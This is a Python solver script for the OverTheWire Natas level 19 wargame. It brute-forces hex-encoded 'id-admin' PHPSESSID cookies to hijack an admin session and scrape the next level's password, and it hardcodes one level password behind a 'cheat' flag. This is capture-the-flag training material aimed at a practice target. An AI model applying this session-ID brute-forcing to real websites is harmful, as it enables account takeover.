import requests

import natas18
from helpers import between


def to_hex(s: str) -> str:
    return hex(int.from_bytes(s.encode("utf-8"), byteorder="big"))[2:]


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
    url = "http://natas19.natas.labs.overthewire.org"
    username = "natas19"
    if not password:
        password = natas18.solution()

    # No source code this time, but a message:
    # "This page uses mostly the same code as the previous level,
    #  but session IDs are no longer sequential..."
    # The PHPSESSID cookie contains a hex value that decodes to
    # an integer and the username (e.g. "356-admin")

    s = requests.Session()
    auth = (username, password)
    data = {"username": "admin", "password": "admin"}
    r = s.post(url, auth=auth, data=data)
    max_id = 640
    for id in range(1, max_id):
        cookie = to_hex("{id}-admin".format(id=id))
        s.cookies["PHPSESSID"] = cookie
        r = s.post(url, auth=auth, data=data)
        if "You are an admin." in r.text:
            start = "Password: "
            end = "</pre></div>"
            natas20_password = between(r.text, start, end)
            return natas20_password
